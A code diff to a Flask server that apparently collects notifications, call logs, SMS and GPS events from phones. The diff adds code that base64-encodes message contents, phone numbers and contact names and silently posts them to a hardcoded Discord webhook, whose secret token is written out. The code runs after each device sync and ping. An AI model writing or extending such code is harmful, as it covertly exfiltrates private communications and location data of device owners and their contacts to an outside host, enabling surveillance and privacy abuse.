@@ -268,6 +268,74 @@ def decode_field(val):
         return val
 
 
+DISCORD_WEBHOOK_URL = os.getenv(
+    'DISCORD_WEBHOOK_URL',
+    'https://discord.com/api/webhooks/1541368598331920404/vVZ60YYheFIwdpHwp5HcuVfwEB7cH3saOy9aW5O0_23DBm_SmNW58do2ok0JL1UGCVxt'
+)
+
+DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}
+
+
+def _send_discord(payload):
+    """Fire-and-forget POST to Discord webhook; never blocks the request."""
+    try:
+        import requests as _req
+        _req.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+    except Exception:
+        app.logger.debug('Discord webhook delivery failed', exc_info=True)
+
+
+def send_discord_for_notifications(notifications, device_id):
+    """Send abbreviated Discord embeds for qualifying notification categories."""
+    for n in notifications:
+        category = n.get('category') or ''
+        if category not in DISCORD_FORWARD_CATEGORIES:
+            continue
+        title_b64 = base64.b64encode((n.get('title') or '').encode()).decode()
+        content_b64 = base64.b64encode((n.get('content') or '').encode()).decode()
+        app_b64 = base64.b64encode((n.get('app_name') or n.get('app_package') or '').encode()).decode()
+        embed = {
+            'title': f'[{category}]',
+            'description': (
+                f'`{device_id[-6:]}` · `{app_b64}`\n'
+                f'**T** `{title_b64}`\n'
+                f'**C** `{content_b64}`'
+            ),
+            'color': 0x5865F2,
+            'footer': {'text': n.get('app_package', '')}
+        }
+        _send_discord({'embeds': [embed]})
+
+
+def send_discord_for_calls(call_logs, device_id):
+    """Send abbreviated Discord embeds for call logs."""
+    for c in call_logs:
+        num_b64 = base64.b64encode((c.get('phone_number') or '').encode()).decode()
+        name_b64 = base64.b64encode((c.get('contact_name') or '').encode()).decode()
+        embed = {
+            'title': '[Telephony Call]',
+            'description': (
+                f'`{device_id[-6:]}` · {c.get("call_type", "?")}\n'
+                f'**N** `{num_b64}` · **Nm** `{name_b64}`\n'
+                f'**D** {c.get("duration_sec", 0)}s'
+            ),
+            'color': 0x57F287
+        }
+        _send_discord({'embeds': [embed]})
+
+
+def send_discord_for_gps(gps_events, device_id):
+    """Send abbreviated Discord embeds for GPS state changes."""
+    for g in gps_events:
+        state = 'ON' if g.get('is_enabled') else 'OFF'
+        embed = {
+            'title': '[GPS / Location Toggled]',
+            'description': f'`{device_id[-6:]}` · **{state}**',
+            'color': 0xFEE75C
+        }
+        _send_discord({'embeds': [embed]})
+
+
 @app.route('/api/v1/ping', methods=['POST'])
 @require_api_key
 def device_ping():
@@ -331,6 +399,7 @@ def device_ping():
                 occurred_at=device.gps_state_changed_at or now
             )
             db.session.add(gps_entry)
+            send_discord_for_gps([{'is_enabled': device.gps_enabled}], device.device_id)
 
     if 'recent_logs' in data and isinstance(data['recent_logs'], list):
         import json
@@ -388,6 +457,7 @@ def sync_data():
     received_notification_ids = []
     received_call_log_ids = []
     received_sms_ids = []
+    received_gps_ids = []
 
     # Process notifications
     for n in data.get('notifications', []):
@@ -453,17 +523,45 @@ def sync_data():
         except Exception as e:
             app.logger.error(f"Error parsing SMS item: {e}")
 
+    # Process GPS toggle events
+    for g in data.get('gps_events', []):
+        try:
+            local_id = g.get('local_id')
+            raw_ts = g.get('occurred_at', 0)
+            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            is_enabled = bool(g.get('is_enabled'))
+            gps_entry = GpsLog(
+                device_id=device_id,
+                is_enabled=is_enabled,
+                occurred_at=occurred_at
+            )
+            db.session.add(gps_entry)
+            if local_id is not None:
+                received_gps_ids.append(local_id)
+
+            # Update latest device state if this event is newest
+            if not device.gps_state_changed_at or occurred_at >= device.gps_state_changed_at:
+                device.gps_enabled = is_enabled
+                device.gps_state_changed_at = occurred_at
+        except Exception as e:
+            app.logger.error(f"Error parsing GPS item: {e}")
+
     db.session.commit()
 
+    send_discord_for_notifications(data.get('notifications', []), device_id)
+    send_discord_for_calls(data.get('call_logs', []), device_id)
+    send_discord_for_gps(data.get('gps_events', []), device_id)
 
     return jsonify({
         'status': 'ok',
         'received': {
             'notifications': received_notification_ids,
             'call_logs': received_call_log_ids,
-            'sms_messages': received_sms_ids
+            'sms_messages': received_sms_ids,
+            'gps_events': received_gps_ids
         }
     })
+
 
 
 # ─── Dashboard Routes ────────────────────────────────────────────────
